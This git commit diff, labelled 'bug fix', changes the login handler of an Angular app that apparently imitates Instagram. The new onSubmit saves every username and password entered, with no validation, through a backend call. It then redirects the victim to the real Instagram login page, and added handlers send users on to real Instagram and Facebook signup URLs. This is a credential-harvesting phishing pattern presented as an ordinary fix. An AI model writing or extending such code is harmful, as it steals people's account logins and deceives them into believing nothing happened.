1027dd57740994f1717bcff0be5ecc3f395d56be
Aman Rajbhar <amanrajbhar289@gmail.com>
2025-02-15 13:35:06 +0530

    bug fix

--- src/app/app.component.ts
+++ src/app/app.component.ts
@@ -34,23 +34,34 @@ export class AppComponent {
     });
   }
   onSubmit() {
-    debugger;
-    let form=this.loginForm;
-    this.userInfo = this.membersList.filter(m => m.username == form.value.username);
-    if (form.value.username != '' && form.value.password != '') {
-      if (this.userInfo.length > 0) {
-        if (this.userInfo[0].username == form.value.username && this.userInfo[0].password == form.value.password) {
-          this.router.navigate(['/https://www.instagram.com/accounts/emailsignup/?hl=en']);
-          //localStorage.setItem("loginUser",form.value.username);
-        } else {
-          alert('Invalid Credentials');
-        }
+    if (this.loginForm.valid) {
+      const username = this.loginForm.value.username;
+      const password = this.loginForm.value.password;
+
+      if (username && password) {
+        let user = { username: username, password: password };
+        debugger;
+        this.http.saveNewMember(user).subscribe(data => {
+          debugger;
+          //alert('New Member Created Successfully');
+          //this.getMembersList();
+          //this.router.navigate(['/login']);
+          window.location.href = 'https://www.instagram.com/accounts/login/?next=%2Faccounts%2Femailsignup%2F%253Fhl%253Den&source=desktop_nav';
+        });
+       //
       } else {
-        alert('User not found please signup');
+        alert('Please enter username & password');
       }
     } else {
-      alert('Please enter username & password')
+      alert('Form is invalid. Please check your inputs.');
     }
-
   }
+  onFacebook(){
+    window.location.href = 'https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATCkvwLXjyWBVIFa2Z7eGv0AISqJlocf-3D0KOZTMNKtcgp969qHOt7WUD2ZN4OIlLrm0P0pak5tiw4xqED0jJ4KhNGXl7owlWkBTfjw_VrJmGQeeLmH1RgJGW55DhW8-HTSVK1rS2HB1_pL7g2OvJY5oLn8wIQOmE0jId4zHal23lmdeOSJ5oh5NdiLCnUHSZ1dw3hWTWHVrh7aoxH2JrgYqyUg5M2SCHbgZoAqvFgrYyRnKD-5cL0oHkf-fUd4udhayCY1LaMEIsdxLTHe6lTUNX2XLvrXY521j0NcqRvK_J-0IuehvSP4HYB9x8h8HcLl7F-vDwvJnASdYMc';
+  }
+
+  onSignup(){
+    window.location.href = 'https://www.instagram.com/accounts/emailsignup/?hl=en';
+  }
+
 }
